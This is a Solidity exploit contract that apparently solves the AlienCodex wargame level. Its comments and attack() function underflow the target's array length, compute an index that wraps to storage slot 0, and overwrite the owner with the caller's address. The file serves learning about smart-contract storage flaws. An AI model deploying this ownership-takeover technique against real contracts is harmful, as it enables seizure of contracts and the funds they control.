// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// AlienCodex Hack Contract

interface IAlienCodex {
    function owner() external view returns (address);

    function makeContact() external;

    function retract() external;

    function revise(uint i, bytes32 _content) external;
}

contract AlienCodexHack {
    /*
    storage layout
    0: owner (20 bytes), contact (1 byte)
    1: length of codex array

    codex array elements in slots
    h = keccak256(1), 1 is the slot of the codex array length
    slot h ...... codex[0]
    slot h + 1 .. codex[1]
    slot h + 2 .. codex[2]
    slot h + 3 .. codex[3]

    slot h + 2 ** 256 - 1 .. codex[2 ** 256 - 1] 

    find i such that
    slot h + i = slot 0
    h + i = 0 so i = 0 - h
    */
   
    IAlienCodex public immutable alienCodex;

    constructor(address _alienCodex) {
        alienCodex = IAlienCodex(_alienCodex);
    }

    function attack() external {
        alienCodex.makeContact();
        alienCodex.retract();

        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;

        unchecked {
            i -= h;
        }

        alienCodex.revise(i, bytes32(uint256(uint160(msg.sender))));
    }
}
